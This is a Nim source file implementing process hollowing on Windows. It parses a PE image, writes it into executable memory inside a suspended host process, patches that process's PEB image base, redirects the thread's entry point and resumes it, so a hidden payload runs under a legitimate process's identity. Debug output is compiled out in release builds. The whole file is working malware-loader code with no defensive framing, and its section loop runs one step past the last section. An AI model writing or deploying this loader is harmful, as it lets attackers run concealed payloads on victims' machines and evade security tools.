import winim
import ptr_math
import std/strutils


proc simpleHollow*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =

    # Parse PE
    var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
    var peBytesPtr = addr peBytes[0]
    var peImageDosHeader = cast[ptr IMAGE_DOS_HEADER](peBytesPtr)
    var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS64]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
    var peImageSectionsHeader = cast[ptr IMAGE_SECTION_HEADER](cast[size_t](peImageNtHeaders) + sizeof(IMAGE_NT_HEADERS))
    var peImageSizeOfHeaders = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfHeaders)
    var peImageSize = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfImage)
    var peImageImageBase = cast[LPVOID](peImageNtHeaders.OptionalHeader.ImageBase)
    var peImageEntryPoint = cast[PVOID](peImageNtHeaders.OptionalHeader.AddressOfEntryPoint)

    # Extract process information
    let sponsorProcessHandle = processInfoAddress.hProcess
    let sponsorThreadHandle = processInfoAddress.hThread
    let sponsorPid = processInfoAddress.dwProcessId
    let sponsorTid = processInfoAddress.dwThreadId
    when not defined(release): echo "[i] Sponsor PID: " & $sponsorPid
    when not defined(release): echo "[i] Sponsor TID: " & $sponsorTid
    
    # Get remote PEB address
    when not defined(release): echo "[*] Retrieving PEB address" 
    var bi: PROCESS_BASIC_INFORMATION
    var ret: DWORD
    if NtQueryInformationProcess(
        sponsorProcessHandle,
        0,
        addr bi,
        cast[windef.ULONG](sizeof(bi)),
        addr ret
    ) != 0:
        when not defined(release): echo "[-] Could not query sponsor process"   
        quit()
    
    let sponsorPeb = bi.PebBaseAddress
    when not defined(release): echo "[i] Sponsor PEB address: 0x" & $cast[int](sponsorPeb).toHex

    # Allocate memory in sponsor process
    when not defined(release): echo "[*] Allocating memory in sponsor process"    
    var newImageBaseAddress = VirtualAllocEx(
        sponsorProcessHandle,
        peImageImageBase,
        peImageSize,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )
    if newImageBaseAddress != peImageImageBase:
        when not defined(release): echo "[-] Could not allocate at preffered address - 0x" & $cast[int](peImageImageBase).toHex   
        quit()
     
    when not defined(release): echo "[i] New image base address (preferred): 0x" & $cast[int](newImageBaseAddress).toHex 
    when not defined(release): echo "[i] New entrypoint: 0x" & $(cast[int](newImageBaseAddress) + cast[int](peImageEntryPoint)).toHex 

    # Copy PE headers to sponsor process 
    when not defined(release): echo "[*] Copying PE headers to sponsor process"    
    if WriteProcessMemory(
        sponsorProcessHandle,
        newImageBaseAddress,
        peBytesPtr,
        peImageSizeOfHeaders,
        NULL
    ) != TRUE:
        when not defined(release): echo "[-] Could not write to sponsor process"
        quit() 

    # Copy PE sections to sponsor process
    when not defined(release): echo "[*] Copying PE sections to sponsor process"    
    for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections)):
        if WriteProcessMemory(
            sponsorProcessHandle,
            newImageBaseAddress + peImageSectionsHeader[i].VirtualAddress,
            peBytesPtr + peImageSectionsHeader[i].PointerToRawData,
            peImageSectionsHeader[i].SizeOfRawData,
            NULL
        ) != TRUE:
            when not defined(release): echo "[-] Could not write to sponsor process"
            quit() 
    
    # Overwrite sponsor PEB with the new image base address 
    when not defined(release): echo "[*] Overwriting PEB with the new image base address"
    if WriteProcessMemory(
        sponsorProcessHandle,
        cast[LPVOID](cast[int](sponsorPeb) + 0x10),
        addr newImageBaseAddress,
        8,
        NULL
    ) != TRUE:
        when not defined(release): echo "[-] Could not write to sponsor process"
        quit() 

    # Change sponsor thread Entrypoint
    var context: CONTEXT
    context.ContextFlags = CONTEXT_INTEGER
    if GetThreadContext(sponsorThreadHandle, addr context) == FALSE:
        when not defined(release): echo "[-] Could not read from sponsor process PEB"
        quit()
    var entryPoint = cast[DWORD64](newImageBaseAddress) + cast[DWORD64](peImageEntryPoint)
    when not defined(release): echo "[i] Changing RCX register to point the new entrypoint: 0x" & $context.Rcx.toHex & " -> 0x" & $entryPoint.toHex
    context.Rcx = cast[DWORD64](entryPoint)
    if SetThreadContext(sponsorThreadHandle, addr context) == FALSE:
        when not defined(release): echo "[-] Could not write to sponsor process PEB"
        quit()
    
    # Resume remote thread 
    when not defined(release): echo "[*] Resuming remote thread"
    ResumeThread(sponsorThreadHandle)
    
